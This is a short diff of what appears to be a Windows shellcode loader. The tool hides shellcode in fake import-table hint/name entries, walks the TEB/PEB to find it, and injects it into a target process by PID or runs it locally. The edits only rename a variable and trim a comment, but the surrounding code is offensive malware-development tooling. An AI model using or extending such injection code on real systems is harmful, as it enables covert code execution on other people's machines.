@@ -42,7 +42,7 @@ bool IsFakeEntry(PIMAGE_SECTION_HEADER fakeSection, DWORD importLookupTableRVA) 
 
 // Parse the shellcode from its hint/name table
 PBYTE ParseTheShellcode(size_t &shellcodeSize) {
-	PIMAGE_IMPORT_DESCRIPTOR* fakeImportList;
+	PIMAGE_IMPORT_DESCRIPTOR* fakeDllEntryArray;
 	int fakeDllEntryArraySize = 0;
 	PBYTE TEBPtr = (PBYTE) __readgsqword(0x30);
 	PBYTE PEBPtr = *((PBYTE*)(TEBPtr + 0x060));
@@ -77,7 +77,7 @@ PBYTE ParseTheShellcode(size_t &shellcodeSize) {
 		return NULL;
 	}
 	size_t parsedSize = 0;
-	fakeImportList = (PIMAGE_IMPORT_DESCRIPTOR*) HeapAlloc(GetProcessHeap(), NULL, importDirectorySize);
+	fakeDllEntryArray = (PIMAGE_IMPORT_DESCRIPTOR*) HeapAlloc(GetProcessHeap(), NULL, importDirectorySize);
 	if (fakeDllEntryArray == NULL) {
 		std::cout << "[!] Array allocation problem !" << std::endl;
 		return NULL;
@@ -174,7 +174,7 @@ int main(int argc, char *argv[]) {
 	uint64_t fileSize = 0;
 	// Parse the shellcode from hint/name table
 	mergedShellcode = ParseTheShellcode(shellcodeSize);
-	// Inject the given shellcode to the process whose PID is given or execute it locally.
+	// Inject the given shellcode to the process whose PID is given or execute it
 	if (argc < 2) {
 		InjectShellcode(mergedShellcode, shellcodeSize, GetCurrentProcessId());
 	}	
